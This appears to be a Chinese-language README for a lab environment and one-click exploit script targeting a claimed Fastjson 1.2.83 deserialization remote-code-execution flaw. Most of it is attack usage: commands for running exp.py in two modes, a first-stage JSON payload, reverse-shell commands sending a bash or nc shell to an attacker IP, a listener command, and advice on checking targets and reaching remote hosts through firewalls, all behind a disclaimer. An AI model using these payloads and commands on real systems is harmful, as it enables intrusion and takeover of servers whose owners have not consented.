# Fastjson 1.2.83 RCE 漏洞环境 & PoC (QVD-2026-43021)

> 🔬 **安全研究 & 教育目的** — Fastjson 1.2.83 `@JSONType` 反序列化远程代码执行漏洞演示环境

---

## ⚠️ 免责声明 (Disclaimer)

**本项目的所有内容仅供授权安全测试、CTF 竞赛、安全研究及教育用途。**

在使用本项目之前，您必须：

1. **获得目标系统的明确书面授权**后方可进行安全测试
2. **遵守当地法律法规**，不得用于任何非法目的
3. **自行承担所有法律责任**，项目作者不对任何滥用行为负责

如果您是用于学习研究，建议在本机或自建虚拟机环境中进行测试。

**未经授权的使用可能构成犯罪。请合法使用。**

> **English:** This project is for **authorized security testing, CTF competitions, security research, and educational purposes ONLY**. You must have explicit written permission before testing any system. The authors assume no liability for misuse.

---

## 目录

1. [工具包说明](#一工具包说明)
2. [构建靶场](#二构建靶场)
3. [启动靶场](#三启动靶场)
4. [JDK8-HTTP 模式（JDK 8 专用）](#四jdk8-http-模式jdk-8-专用)
5. [FD 链模式（JDK 8~25 全版本）](#五fd-链模式jdk-825-全版本)
6. [常见问题](#六常见问题)

---

## 一、工具包说明

```
靶场在target目录
mk.py                  fd模式手工payload生成脚本
poc/                         ← 独立可迁移，随便放哪都行
├── exp.py                   ★ 一键利用脚本
├── GenProbe.class             探针生成器
├── lib/
│   ├── asm-9.6.jar            ASM 字节码操作库
│   └── fastjson-1.2.83.jar    Fastjson 依赖
└── www/                       探针托管目录（自动生成）
```

**依赖（仅需这两样）：**

- Python 3
- JDK 8+（能执行 `java` 命令即可）

**用法格式：**

```bash
cd poc/
python3 exp.py 攻击机IP 攻击机端口 目标URL [选项]
```

**选项：**

| 参数           | 默认值      | 说明                                |
| ------------ | -------- | --------------------------------- |
| `--mode`     | `fd`     | 利用模式: `jdk8-http` / `fd` / `auto` |
| `--cmd`      | `id`     | 要执行的命令                            |
| `--endpoint` | `/parse` | API 端点                            |
| `--timeout`  | `60`     | 超时秒数（FD 模式建议 60+）                 |
| `--max-fd`   | `256`    | FD 枚举上限                           |
| `--tag`      | `""`     | 标签（区分多次测试）                        |

---

## 二、构建靶场

首次使用需要先编译靶场和探针生成器。项目提供了一键构建脚本：

### 一键构建

```bash
bash scripts/build.sh [攻击机IP] [端口] [命令] [模式] [标签]

# 默认参数构建
bash scripts/build.sh

# 指定参数
bash scripts/build.sh 192.168.1.107 19090 "id" fd
```

`scripts/build.sh` 会自动完成：
1. 用 Maven 编译打包 Spring Boot 靶场 → `target/fastjson-rce-env-1.0.0.jar`
2. 下载 ASM 和 Fastjson 依赖到 `poc/lib/`
3. 编译 `GenProbe.java` → `poc/GenProbe.class`
4. 生成初始探针（可选）

### 手动编译

```bash
# 1. 构建靶场（需要 Maven）
mvn package -DskipTests

# 2. 下载依赖库
mkdir -p poc/lib
curl -sL -o poc/lib/asm-9.6.jar https://repo1.maven.org/maven2/org/ow2/asm/asm/9.6/asm-9.6.jar
curl -sL -o poc/lib/fastjson-1.2.83.jar https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.83/fastjson-1.2.83.jar

# 3. 编译探针生成器
javac -cp "poc/lib/*" -d poc poc/GenProbe.java
```

---

## 三、启动靶场
每次测试**必须先启动靶场**，且**每次测试必须重启**（JVM 类加载缓存）。

### 启动命令
```bash
# 1. 清理旧进程
fuser -k 18080/tcp 2>/dev/null

# 2. 启动（JDK 8）
java -jar target/fastjson-rce-env-1.0.0.jar &

# 启动（JDK 17）
java -jar target/fastjson-rce-env-1.0.0.jar &

# 3. 确认启动
sleep 6 && curl -s http://127.0.0.1:18080/info
```

### 预期响应

![Snipaste_2026-07-22_16-32-58.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Snipaste_2026-07-22_16-32-58.png)

```json
{"safeMode":false,"autoTypeSupport":false,"parserConfigCL":"LaunchedURLClassLoader..."}
```

**关键确认点：**

- ✅ `safeMode: false` — 漏洞可利用
- ✅ `LaunchedURLClassLoader` — Spring Boot FatJar
- ✅ `autoTypeSupport: false` — 没开启 autoType 也能打

---

## 四、JDK8-HTTP 模式（JDK 8 专用）

> **适用：** JDK 8  （JDK 9+ 因 defineClass 校验类名而失败）
> **原理：** IP 用整数表示（避免 replace('.','/')），直接 HTTP 拉取恶意 class

```
switch-java 8
java -version
```
![Snipaste_2026-07-22_16-35-15.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Snipaste_2026-07-22_16-35-15.png)


### 一键利用
```bash
cd poc/
python3 exp.py 攻击者ip 19090 http://目标ip:18080 --endpoint 自定义端点 --mode 攻击模式
```

自定义命令：
```bash
python3 exp.py 192.168.1.107 19090 http://192.168.174.128:18080 --mode jdk8-http --endpoint /parse --cmd "id > /tmp/out.txt"
```

**攻击模式参数**:
jdk8-http适合jdk8
fd多版本适合

**反弹shell**
```python
python3 exp.py 192.168.1.107 19090 http://192.168.174.128:18080 --mode jdk8-http --endpoint /parse --cmd "bash -c 'exec bash -i &>/dev/tcp/192.168.1.107/4444 <&1'"
```
**预期输出：**
![Snipaste_2026-07-22_16-41-25.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Snipaste_2026-07-22_16-41-25.png)

![Snipaste_2026-07-22_16-41-48.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Snipaste_2026-07-22_16-41-48.png)

## 五、FD 链模式（JDK 8~25 全版本）

> **适用：** JDK 8/11/17/21/25 全版本
> **原理：** 两步走 — ①目标下载恶意 jar → ②枚举 `/proc/self/fd/N` 找到 jar 并加载
> **优点：** 通杀所有 JDK，类名合法不触发 defineClass 校验
> **注意：** 需要较长超时（60 秒+，要遍历 253 个 fd）

切换jdk17版本
```
switch-java 17
java -version
```

![Snipaste_2026-07-22_16-43-54.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Snipaste_2026-07-22_16-43-54.png)
### 一键利用

自定义命令：
```bash
cd poc
python3 exp.py 192.168.1.107 19090 http://192.168.174.128:18080 --mode fd --endpoint /parse --cmd "bash -c 'exec bash -i &>/dev/tcp/192.168.1.107/4444 <&1'" --timeout 60
```

**预期输出：**
```
[*] Fastjson 1.2.83 RCE  |  mode=fd  |  http://192.168.174.128:18080/parse
    攻击机: 192.168.1.107:19090  命令: id
  poc/probe.jar & poc/www/probe generated
  First stage: {"@type":"jar:http:..3232235883:19090.probe!.foo.Exception"}
  payload: FD链 (255个, fd 3~256)
  发送 14587 字节 ...
  响应 200: {"ok":true,"class":"com.alibaba.fastjson.JSONArray","result":"[{\"@type\":\"jar:http:...
```

返回 `JSONArray` 是正常的——Fastjson 解析数组时已触发 RCE，跟返回值无关。

![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Snipaste_2026-07-22_16-43-54.png)

### 一键全测（先 JDK8-HTTP 后 FD）

有点问题先不用

```bash
python3 exp.py 192.168.1.107 19090 http://192.168.174.128:18080 --mode auto --cmd id
```

## 六、常见问题

### 6.1 每次测试必须重启靶场

```
第一次发包 → JVM 加载 class → 执行 <clinit> → RCE ✅
第二次发包 → JVM 发现已加载 → 返回缓存 → 不执行 ❌
```

**必须：** 每次测试前 `fuser -k 18080/tcp` 再重启。

### 6.2 为什么返回 JSONArray？

FD 模式发的是 JSON 数组 `[{...}, {...}, ...]`，Fastjson 解析后返回数组形态。RCE 在解析过程中就已触发，跟返回值无关。

### 6.3 如何确认目标是否可被利用？

```bash
curl http://目标:18080/info
# → {"safeMode":false,"parserConfigCL":"LaunchedURLClassLoader..."}
```

- `safeMode` 必须为 `false`（默认值）
- 必须是 `LaunchedURLClassLoader`（Spring Boot FatJar 专属）

### 6.4 如何反弹 Shell？

```bash
# 生成探针时命令设为反弹 shell
python3 exp.py 192.168.1.107 19090 http://目标:18080 \
  --mode jdk8-http \
  --cmd "bash -c 'exec bash -i &>/dev/tcp/192.168.1.107/4444 <&1'"

# 或不用 /dev/tcp（更通用）
python3 exp.py 192.168.1.107 19090 http://目标:18080 \
  --mode jdk8-http \
  --cmd "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.1.107 4444 >/tmp/f"
```

先开监听：`nc -lvnp 4444`

### 6.5 远程目标连不上我的 HTTP 服务？

- 检查安全组/防火墙是否放行了端口
- 确保使用目标能访问的 IP（公网 IP 而不是 127.0.0.1）
- IP 整数化：用 `python3 -c "import struct,socket; print(struct.unpack('!I', socket.inet_aton('你的IP'))[0])"` 计算

---

## License

本项目基于 **MIT License** 开源 — 详见 [LICENSE](LICENSE) 文件。

**附加条款：** 任何使用者需自行承担全部法律责任。禁止用于非法目的。
